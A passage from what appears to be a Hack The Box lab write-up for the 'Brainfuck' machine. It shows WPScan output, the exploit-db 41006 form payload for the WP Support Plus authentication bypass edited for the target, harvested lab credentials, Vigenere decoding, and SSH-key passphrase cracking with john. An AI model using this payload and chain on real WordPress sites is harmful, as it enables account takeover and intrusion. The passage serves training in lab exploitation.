</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Started</span><span class=o>:</span> <span class=nx>Tue</span> <span class=nx>May</span>  <span class=mi>9</span> <span class=mi>07</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>36</span> <span class=mi>2023</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Interesting</span> <span class=nx>Finding</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Headers</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Interesting</span> <span class=nx>Entry</span><span class=o>:</span> <span class=nx>Server</span><span class=o>:</span> <span class=nx>nginx</span><span class=o>/</span><span class=mf>1.10.0</span> <span class=p>(</span><span class=nx>Ubuntu</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Found</span> <span class=nx>By</span><span class=o>:</span> <span class=nx>Headers</span> <span class=p>(</span><span class=nx>Passive</span> <span class=nx>Detection</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Confidence</span><span class=o>:</span> <span class=mi>100</span><span class=o>%</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nx>snipped</span> <span class=o>===</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Enumerating</span> <span class=nx>Vulnerable</span> <span class=nx>Plugins</span> <span class=p>(</span><span class=nx>via</span> <span class=nx>Passive</span> <span class=nx>Methods</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Checking</span> <span class=nx>Plugin</span> <span class=nx>Versions</span> <span class=p>(</span><span class=nx>via</span> <span class=nx>Passive</span> <span class=nx>and</span> <span class=nx>Aggressive</span> <span class=nx>Methods</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=nx>Plugin</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span> <span class=nx>Identified</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===</span> <span class=nx>snipped</span> <span class=o>===</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=nx>Title</span><span class=o>:</span> <span class=nx>WP</span> <span class=nx>Support</span> <span class=nx>Plus</span> <span class=nx>Responsive</span> <span class=nx>Ticket</span> <span class=nx>System</span> <span class=o>&lt;</span> <span class=mf>8.0.0</span> <span class=o>-</span> <span class=nx>Privilege</span> <span class=nx>Escalation</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>     <span class=nx>Fixed</span> <span class=k>in</span><span class=o>:</span> <span class=mf>8.0.0</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>     <span class=nx>References</span><span class=o>:</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>      <span class=o>-</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=o>|</span>      <span class=o>-</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=o>|</span>      <span class=o>-</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//packetstormsecurity.com/files/140413/
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=nx>Title</span><span class=o>:</span> <span class=nx>WP</span> <span class=nx>Support</span> <span class=nx>Plus</span> <span class=nx>Responsive</span> <span class=nx>Ticket</span> <span class=nx>System</span> <span class=o>&lt;</span> <span class=mf>8.0.8</span> <span class=o>-</span> <span class=nx>Remote</span> <span class=nx>Code</span> <span class=nx>Execution</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>     <span class=nx>Fixed</span> <span class=k>in</span><span class=o>:</span> <span class=mf>8.0.8</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>     <span class=nx>References</span><span class=o>:</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>      <span class=o>-</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=o>|</span>      <span class=o>-</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//plugins.trac.wordpress.org/changeset/1763596
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Version</span><span class=o>:</span> <span class=mf>7.1.3</span> <span class=p>(</span><span class=mi>80</span><span class=o>%</span> <span class=nx>confidence</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Found</span> <span class=nx>By</span><span class=o>:</span> <span class=nx>Readme</span> <span class=o>-</span> <span class=nx>Stable</span> <span class=nx>Tag</span> <span class=p>(</span><span class=nx>Aggressive</span> <span class=nx>Detection</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>  <span class=o>-</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>WPScan</span> <span class=nx>DB</span> <span class=nx>API</span> <span class=nx>OK</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Plan</span><span class=o>:</span> <span class=nx>free</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Requests</span> <span class=nx>Done</span> <span class=p>(</span><span class=nx>during</span> <span class=nx>the</span> <span class=nx>scan</span><span class=p>)</span><span class=o>:</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Requests</span> <span class=nx>Remaining</span><span class=o>:</span> <span class=mi>72</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Finished</span><span class=o>:</span> <span class=nx>Tue</span> <span class=nx>May</span>  <span class=mi>9</span> <span class=mi>07</span><span class=o>:</span><span class=mi>27</span><span class=o>:</span><span class=mi>43</span> <span class=mi>2023</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Requests</span> <span class=nx>Done</span><span class=o>:</span> <span class=mi>39</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Cached</span> <span class=nx>Requests</span><span class=o>:</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Data</span> <span class=nx>Sent</span><span class=o>:</span> <span class=mf>10.214</span> <span class=nx>KB</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Data</span> <span class=nx>Received</span><span class=o>:</span> <span class=mf>208.404</span> <span class=nx>KB</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Memory</span> <span class=nx>used</span><span class=o>:</span> <span class=mf>246.844</span> <span class=nx>MB</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Elapsed</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>00</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>07</span>
</span></span></code></pre></div><p>I can get RCE.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution
</span></span><span class=line><span class=cl><span class=p>|</span>     Fixed in: 8.0.8
</span></span><span class=line><span class=cl><span class=p>|</span>     References:
</span></span><span class=line><span class=cl><span class=p>|</span>      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
</span></span><span class=line><span class=cl><span class=p>|</span>      - https://plugins.trac.wordpress.org/changeset/1763596
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ searchsploit Support Plus
</span></span><span class=line><span class=cl>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                                                                                                                                            <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>ManageEngine Support Center Plus 7.8 Build <span class=m>7801</span> - Directory Traversal                                                                                                                                     <span class=p>|</span> jsp/webapps/17442.txt
</span></span><span class=line><span class=cl>ManageEngine Support Center Plus <span class=m>7903</span> - Multiple Vulnerabilities                                                                                                                                          <span class=p>|</span> multiple/webapps/18745.txt
</span></span><span class=line><span class=cl>ManageEngine Support Center Plus <span class=m>7908</span> - Multiple Vulnerabilities                                                                                                                                          <span class=p>|</span> jsp/webapps/22040.txt
</span></span><span class=line><span class=cl>ManageEngine Support Center Plus <span class=m>7916</span> - Directory Traversal                                                                                                                                               <span class=p>|</span> php/webapps/31262.txt
</span></span><span class=line><span class=cl>ManageEngine SupportCenter Plus 7.90 - Multiple Vulnerabilities                                                                                                                                           <span class=p>|</span> multiple/webapps/37322.txt
</span></span><span class=line><span class=cl>WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                                                                                                  <span class=p>|</span> php/webapps/34589.txt
</span></span><span class=line><span class=cl>WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                                                                                                    <span class=p>|</span> php/webapps/41006.txt
</span></span><span class=line><span class=cl>WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                                                                                                           <span class=p>|</span> php/webapps/40939.txt
</span></span><span class=line><span class=cl>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span></code></pre></div><p>User enumrate</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>$</span> <span class=nx>wpscan</span> <span class=o>--</span><span class=nx>url</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//brainfuck.htb --disable-tls-checks --enumerate                                                  
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>_______________________________________________________________</span>
</span></span><span class=line><span class=cl>         <span class=nx>__</span>          <span class=nx>_______</span>   <span class=nx>_____</span>
</span></span><span class=line><span class=cl>         <span class=err>\</span> <span class=err>\</span>        <span class=o>/</span> <span class=sr>/  __ \ /</span> <span class=nx>____</span><span class=o>|</span>
</span></span><span class=line><span class=cl>          <span class=err>\</span> <span class=err>\</span>  <span class=o>/</span><span class=err>\</span>  <span class=o>/</span> <span class=err>/| |__) | (___   ___  __ _ _ __ ®</span>
</span></span><span class=line><span class=cl>           <span class=err>\</span> <span class=err>\</span><span class=o>/</span>  <span class=err>\</span><span class=o>/</span> <span class=sr>/ |  ___/</span> <span class=err>\</span><span class=nx>___</span> <span class=err>\</span> <span class=o>/</span> <span class=nx>__</span><span class=o>|</span><span class=sr>/ _` | &#39;_ \
</span></span></span><span class=line><span class=cl><span class=sr>            \  /</span><span class=err>\</span>  <span class=o>/</span>  <span class=o>|</span> <span class=o>|</span>     <span class=nx>____</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=nx>__</span><span class=o>|</span> <span class=p>(</span><span class=nx>_</span><span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>             <span class=err>\</span><span class=o>/</span>  <span class=err>\</span><span class=o>/</span>   <span class=o>|</span><span class=nx>_</span><span class=o>|</span>    <span class=o>|</span><span class=nx>_____</span><span class=o>/</span> <span class=err>\</span><span class=nx>___</span><span class=o>|</span><span class=err>\</span><span class=nx>__</span><span class=p>,</span><span class=nx>_</span><span class=o>|</span><span class=nx>_</span><span class=o>|</span> <span class=o>|</span><span class=nx>_</span><span class=o>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=nx>WordPress</span> <span class=nx>Security</span> <span class=nx>Scanner</span> <span class=nx>by</span> <span class=nx>the</span> <span class=nx>WPScan</span> <span class=nx>Team</span>
</span></span><span class=line><span class=cl>                         <span class=nx>Version</span> <span class=mf>3.8.22</span>
</span></span><span class=line><span class=cl>       <span class=nx>Sponsored</span> <span class=nx>by</span> <span class=nx>Automattic</span> <span class=o>-</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//automattic.com/
</span></span></span><span class=line><span class=cl><span class=c1></span>       <span class=err>@</span><span class=nx>_WPScan_</span><span class=p>,</span> <span class=err>@</span><span class=nx>ethicalhack3r</span><span class=p>,</span> <span class=err>@</span><span class=nx>erwan_lr</span><span class=p>,</span> <span class=err>@</span><span class=nx>firefart</span>
</span></span><span class=line><span class=cl><span class=nx>_______________________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>URL</span><span class=o>:</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//brainfuck.htb/ [10.10.10.17]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Started</span><span class=o>:</span> <span class=nx>Tue</span> <span class=nx>May</span>  <span class=mi>9</span> <span class=mi>07</span><span class=o>:</span><span class=mi>35</span><span class=o>:</span><span class=mi>20</span> <span class=mi>2023</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Interesting</span> <span class=nx>Finding</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=o>===</span><span class=nx>snipped</span><span class=o>===</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=nx>User</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span> <span class=nx>Identified</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>admin</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Found</span> <span class=nx>By</span><span class=o>:</span> <span class=nx>Author</span> <span class=nx>Posts</span> <span class=o>-</span> <span class=nx>Display</span> <span class=nx>Name</span> <span class=p>(</span><span class=nx>Passive</span> <span class=nx>Detection</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Confirmed</span> <span class=nx>By</span><span class=o>:</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>  <span class=nx>Rss</span> <span class=nx>Generator</span> <span class=p>(</span><span class=nx>Passive</span> <span class=nx>Detection</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>  <span class=nx>Author</span> <span class=nx>Id</span> <span class=nx>Brute</span> <span class=nx>Forcing</span> <span class=o>-</span> <span class=nx>Author</span> <span class=nx>Pattern</span> <span class=p>(</span><span class=nx>Aggressive</span> <span class=nx>Detection</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>|</span>  <span class=nx>Login</span> <span class=nb>Error</span> <span class=nx>Messages</span> <span class=p>(</span><span class=nx>Aggressive</span> <span class=nx>Detection</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>administrator</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Found</span> <span class=nx>By</span><span class=o>:</span> <span class=nx>Author</span> <span class=nx>Id</span> <span class=nx>Brute</span> <span class=nx>Forcing</span> <span class=o>-</span> <span class=nx>Author</span> <span class=nx>Pattern</span> <span class=p>(</span><span class=nx>Aggressive</span> <span class=nx>Detection</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=o>|</span> <span class=nx>Confirmed</span> <span class=nx>By</span><span class=o>:</span> <span class=nx>Login</span> <span class=nb>Error</span> <span class=nx>Messages</span> <span class=p>(</span><span class=nx>Aggressive</span> <span class=nx>Detection</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=nx>No</span> <span class=nx>WPScan</span> <span class=nx>API</span> <span class=nx>Token</span> <span class=nx>given</span><span class=p>,</span> <span class=nx>as</span> <span class=nx>a</span> <span class=nx>result</span> <span class=nx>vulnerability</span> <span class=nx>data</span> <span class=nx>has</span> <span class=nx>not</span> <span class=nx>been</span> <span class=nx>output</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=nx>You</span> <span class=nx>can</span> <span class=nx>get</span> <span class=nx>a</span> <span class=nx>free</span> <span class=nx>API</span> <span class=nx>token</span> <span class=kd>with</span> <span class=mi>25</span> <span class=nx>daily</span> <span class=nx>requests</span> <span class=nx>by</span> <span class=nx>registering</span> <span class=nx>at</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//wpscan.com/register
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Finished</span><span class=o>:</span> <span class=nx>Tue</span> <span class=nx>May</span>  <span class=mi>9</span> <span class=mi>07</span><span class=o>:</span><span class=mi>37</span><span class=o>:</span><span class=mi>00</span> <span class=mi>2023</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Requests</span> <span class=nx>Done</span><span class=o>:</span> <span class=mi>3411</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Cached</span> <span class=nx>Requests</span><span class=o>:</span> <span class=mi>43</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Data</span> <span class=nx>Sent</span><span class=o>:</span> <span class=mf>939.757</span> <span class=nx>KB</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Data</span> <span class=nx>Received</span><span class=o>:</span> <span class=mf>747.878</span> <span class=nx>KB</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Memory</span> <span class=nx>used</span><span class=o>:</span> <span class=mf>281.445</span> <span class=nx>MB</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Elapsed</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>00</span><span class=o>:</span><span class=mi>01</span><span class=o>:</span><span class=mi>40</span>
</span></span></code></pre></div><p>We found user admin.
Try to use <code>php/webapps/41006.txt</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ cp /usr/share/exploitdb/exploits/php/webapps/41006.txt .
</span></span><span class=line><span class=cl>$ cat 41006.txt                                           
</span></span><span class=line><span class=cl><span class=c1># Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation</span>
</span></span><span class=line><span class=cl><span class=c1># Date: 10-01-2017</span>
</span></span><span class=line><span class=cl><span class=c1># Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Author: Kacper Szurek</span>
</span></span><span class=line><span class=cl><span class=c1># Contact: http://twitter.com/KacperSzurek</span>
</span></span><span class=line><span class=cl><span class=c1># Website: http://security.szurek.pl/</span>
</span></span><span class=line><span class=cl><span class=c1># Category: web</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1. Description
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie<span class=o>()</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2. Proof of Concept
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;form <span class=nv>method</span><span class=o>=</span><span class=s2>&#34;post&#34;</span> <span class=nv>action</span><span class=o>=</span><span class=s2>&#34;http://wp/wp-admin/admin-ajax.php&#34;</span>&gt;
</span></span><span class=line><span class=cl>        Username: &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;username&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;administrator&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;hidden&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;email&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;sth&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;hidden&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;action&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;loginGuestFacebook&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;submit&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;Login&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;/form&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Then you can go to admin panel.
</span></span></code></pre></div><p>Edit this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ edit 41006.txt
</span></span><span class=line><span class=cl>$ mv 41006.txt 41006.html
</span></span><span class=line><span class=cl>$ cat 41006.html  
</span></span><span class=line><span class=cl>&lt;form <span class=nv>method</span><span class=o>=</span><span class=s2>&#34;post&#34;</span> <span class=nv>action</span><span class=o>=</span><span class=s2>&#34;https://brainfuck.htb/wp-admin/admin-ajax.php&#34;</span>&gt;
</span></span><span class=line><span class=cl>        Username: &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;username&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;admin&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;hidden&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;email&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;sth&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;hidden&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;action&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;loginGuestFacebook&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;submit&#34;</span> <span class=nv>value</span><span class=o>=</span><span class=s2>&#34;Login&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;/form&gt;
</span></span></code></pre></div><p>And launch http server on local machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ python3 -m http.server <span class=m>8080</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8080</span> <span class=o>(</span>http://0.0.0.0:8080/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>127.0.0.1 - - <span class=o>[</span>09/May/2023 07:51:30<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span><span class=line><span class=cl>127.0.0.1 - - <span class=o>[</span>09/May/2023 07:51:31<span class=o>]</span> <span class=s2>&#34;GET /41006.html HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span></code></pre></div><p>And login… I got admin&rsquo;s permission.
In admin dashboard, I can find SMTP account.</p><pre tabindex=0><code>Dashboard &gt; Settings &gt; General Settings &gt; Easy WP SMTP Settings (HTML)
</code></pre><p>SMTP Account</p><pre tabindex=0><code>Email: orestis@brainfuck.htb, Pass:kHGuERB29DNiNE
</code></pre><p>In mailbox, we can find message
(Using Email client called evolution)</p><pre tabindex=0><code>Hi there, your credentials for our &#34;secret&#34; forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
</code></pre><p>Move to <a href=https://sup3rs3cr3t.brainfuck.htb/><code>https://sup3rs3cr3t.brainfuck.htb</code></a></p><p>Login bellow username/password</p><p>In <a href=https://sup3rs3cr3t.brainfuck.htb/d/3-key/2><code>https://sup3rs3cr3t.brainfuck.htb/d/3-key/2</code></a> , I found strange messages.</p><pre tabindex=0><code>Pieagnm - Jkoijeg nbw zwx mle grwsnn
</code></pre><p><a href=https://www.boxentriq.com/code-breaking/cipher-identifier>https://www.boxentriq.com/code-breaking/cipher-identifier</a> said, that is <strong><strong><a href=https://www.boxentriq.com/code-breaking/cipher-identifier#vigenere-cipher><code>Vigenere Cipher</code></a></strong></strong></p><p>We can solve it with <a href=https://rumkin.com/tools/cipher/one-time-pad/>https://rumkin.com/tools/cipher/one-time-pad/</a></p><p>PAD: <code>Orestis - Hacking for fun and profit</code>
Decode text: <code>Pieagnm - Jkoijeg nbw zwx mle grwsnn</code>
We can get key, <code>fuckmybrain</code>
And decode forum message.</p><pre tabindex=0><code>There you go you stupid fuck, I hope you remember your key password because I dont :)

https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
</code></pre><p>We get SSH key.
Try to get passphrase</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ ssh2john ./id_rsa &gt; ssh.hash                                                 
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/lab/brainfuck<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ls
</span></span><span class=line><span class=cl>41006.html  id_rsa  ssh.hash
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/lab/brainfuck<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ john ssh.hash --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt 
</span></span><span class=line><span class=cl>Created directory: /home/kali/.john
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>SSH, SSH private key <span class=o>[</span>RSA/DSA/EC/OPENSSH 32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>KDF/cipher <span class=o>[</span><span class=nv>0</span><span class=o>=</span>MD5/AES <span class=nv>1</span><span class=o>=</span>MD5/3DES <span class=nv>2</span><span class=o>=</span>Bcrypt/AES<span class=o>])</span> is <span class=m>0</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>1</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>3poulakia!       <span class=o>(</span>./id_rsa<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:00:02 DONE <span class=o>(</span>2023-05-09 08:33<span class=o>)</span> 0.4132g/s 5148Kp/s 5148Kc/s 5148KC/s 3prash0..3pornuthin
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed.
</span></span></code></pre></div><p>Get user flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>$</span> <span class=nx>ssh</span> <span class=o>-</span><span class=nx>i</span> <span class=p>.</span><span class=o>/</span><span class=nx>id_rsa</span> <span class=nx>orestis</span><span class=err>@</span><span class=mf>10.10.10.17</span>   
</span></span><span class=line><span class=cl><span class=nx>The</span> <span class=nx>authenticity</span> <span class=k>of</span> <span class=nx>host</span> <span class=s1>&#39;10.10.10.17 (10.10.10.17)&#39;</span> <span class=nx>can</span><span class=s1>&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=s1>ED25519 key fingerprint is SHA256:R2LI9xfR5z8gb7vJn7TAyhLI9RT5GEVp76CK9aoKnM8.
</span></span></span><span class=line><span class=cl><span class=s1>This key is not known by any other names.
